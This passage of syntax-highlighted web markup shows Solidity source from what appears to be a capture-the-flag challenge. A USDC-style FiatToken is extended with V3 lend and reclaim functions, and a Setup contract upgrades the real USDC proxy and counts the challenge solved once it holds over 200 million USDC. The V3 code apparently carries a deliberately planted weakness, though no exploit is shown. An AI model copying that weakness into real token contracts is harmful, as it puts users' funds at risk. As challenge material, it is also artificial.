punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Increase the allowance by a given increment\n     * @param spender   Spender's address\n     * @param increment Amount of increase in allowance\n     * @return True if successful\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">increaseAllowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> increment<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        whenNotPaused\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_increaseAllowance</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> increment<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Decrease the allowance by a given decrement\n     * @param spender   Spender's address\n     * @param decrement Amount of decrease in allowance\n     * @return True if successful\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">decreaseAllowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> decrement<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        whenNotPaused\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_decreaseAllowance</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> decrement<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Execute a transfer with a signed authorization\n     * @param from          Payer's address (Authorizer)\n     * @param to            Payee's address\n     * @param value         Amount to be transferred\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferWithAuthorization</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validAfter<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validBefore<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> whenNotPaused <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span> <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_transferWithAuthorization</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n            to<span class=\"token punctuation\">,</span>\n            value<span class=\"token punctuation\">,</span>\n            validAfter<span class=\"token punctuation\">,</span>\n            validBefore<span class=\"token punctuation\">,</span>\n            nonce<span class=\"token punctuation\">,</span>\n            v<span class=\"token punctuation\">,</span>\n            r<span class=\"token punctuation\">,</span>\n            s\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Update allowance with a signed authorization\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param value         Amount of allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approveWithAuthorization</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validAfter<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validBefore<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> whenNotPaused <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">)</span> <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_approveWithAuthorization</span><span class=\"token punctuation\">(</span>\n            owner<span class=\"token punctuation\">,</span>\n            spender<span class=\"token punctuation\">,</span>\n            value<span class=\"token punctuation\">,</span>\n            validAfter<span class=\"token punctuation\">,</span>\n            validBefore<span class=\"token punctuation\">,</span>\n            nonce<span class=\"token punctuation\">,</span>\n            v<span class=\"token punctuation\">,</span>\n            r<span class=\"token punctuation\">,</span>\n            s\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Increase allowance with a signed authorization\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param increment     Amount of increase in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">increaseAllowanceWithAuthorization</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> increment<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validAfter<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validBefore<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> whenNotPaused <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">)</span> <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_increaseAllowanceWithAuthorization</span><span class=\"token punctuation\">(</span>\n            owner<span class=\"token punctuation\">,</span>\n            spender<span class=\"token punctuation\">,</span>\n            increment<span class=\"token punctuation\">,</span>\n            validAfter<span class=\"token punctuation\">,</span>\n            validBefore<span class=\"token punctuation\">,</span>\n            nonce<span class=\"token punctuation\">,</span>\n            v<span class=\"token punctuation\">,</span>\n            r<span class=\"token punctuation\">,</span>\n            s\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Decrease allowance with a signed authorization\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param decrement     Amount of decrease in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">decreaseAllowanceWithAuthorization</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> decrement<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validAfter<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validBefore<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> whenNotPaused <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">)</span> <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_decreaseAllowanceWithAuthorization</span><span class=\"token punctuation\">(</span>\n            owner<span class=\"token punctuation\">,</span>\n            spender<span class=\"token punctuation\">,</span>\n            decrement<span class=\"token punctuation\">,</span>\n            validAfter<span class=\"token punctuation\">,</span>\n            validBefore<span class=\"token punctuation\">,</span>\n            nonce<span class=\"token punctuation\">,</span>\n            v<span class=\"token punctuation\">,</span>\n            r<span class=\"token punctuation\">,</span>\n            s\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Attempt to cancel an authorization\n     * @dev Works only if the authorization is not yet used.\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">cancelAuthorization</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> authorizer<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> whenNotPaused <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_cancelAuthorization</span><span class=\"token punctuation\">(</span>authorizer<span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Update allowance with a signed permit\n     * @param owner       Token owner's address (Authorizer)\n     * @param spender     Spender's address\n     * @param value       Amount of allowance\n     * @param deadline    Expiration time, seconds since the epoch\n     * @param v           v of the signature\n     * @param r           r of the signature\n     * @param s           s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">permit</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> deadline<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> whenNotPaused <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">)</span> <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_permit</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">,</span> deadline<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Internal function to increase the allowance by a given increment\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @param increment Amount of increase\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_increaseAllowance</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> increment\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> override <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> allowed<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>spender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>increment<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Internal function to decrease the allowance by a given decrement\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @param decrement Amount of decrease\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_decreaseAllowance</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> decrement\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> override <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>\n            owner<span class=\"token punctuation\">,</span>\n            spender<span class=\"token punctuation\">,</span>\n            allowed<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>spender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>\n                decrement<span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"ERC20: decreased allowance below zero\"</span>\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">/**\n * @title FiatToken V3\n * @notice ERC20 Token backed by fiat reserves, version 3\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">FiatTokenV3</span> <span class=\"token keyword\">is</span> FiatTokenV2 <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// ensure we start on a new storage slot just in case</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">private</span> _gap<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">internal</span> _initializedV3<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> _loans<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Initialize V3 contract\n     * @dev When upgrading to V3, this function must also be invoked by using\n     * upgradeToAndCall instead of upgradeTo, or by calling both from a contract\n     * in a single transaction.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">initializeV3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            <span class=\"token operator\">!</span>_initializedV3<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatTokenV3: contract is already initialized\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        DOMAIN_SEPARATOR <span class=\"token operator\">=</span> EIP712<span class=\"token punctuation\">.</span><span class=\"token function\">makeDomainSeparator</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> <span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        _initializedV3 <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Lends some tokens to the specified address\n     * @param to        Recipient's address\n     * @param amount    Loan amount\n     * @return True if successful\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">lend</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        whenNotPaused\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        _loans<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _loans<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Reclaims previously lent tokens\n     * @param from      The account to which tokens were lent\n     * @param amount    Reclaim amount\n     * @return True if successful\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">reclaim</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        whenNotPaused\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        _loans<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _loans<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"FiatTokenV3: decreased loans below zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\nabstract <span class=\"token keyword\">contract</span> <span class=\"token class-name\">ERC20Like</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> user<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> virtual <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\nabstract <span class=\"token keyword\">contract</span> <span class=\"token class-name\">FiatTokenProxyLike</span> <span class=\"token keyword\">is</span> ERC20Like <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">changeAdmin</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> newAdmin<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> virtual<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">upgradeTo</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> newImplementation<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> virtual<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Setup</span> <span class=\"token punctuation\">&#123;</span>\n    FiatTokenProxyLike <span class=\"token keyword\">private</span> <span class=\"token keyword\">constant</span> USDC <span class=\"token operator\">=</span> <span class=\"token function\">FiatTokenProxyLike</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">upgrade</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        FiatTokenV3 v3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FiatTokenV3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v3<span class=\"token punctuation\">.</span><span class=\"token function\">initialize</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v3<span class=\"token punctuation\">.</span><span class=\"token function\">initializeV2</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v3<span class=\"token punctuation\">.</span><span class=\"token function\">initializeV3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        USDC<span class=\"token punctuation\">.</span><span class=\"token function\">upgradeTo</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        USDC<span class=\"token punctuation\">.</span><span class=\"token function\">changeAdmin</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x807a96288A1A408dBC13DE2b1d087d10356395d2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">FiatTokenV3</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>USDC<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">initializeV3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isSolved</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> USDC<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">200</span>_000_000e6<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><s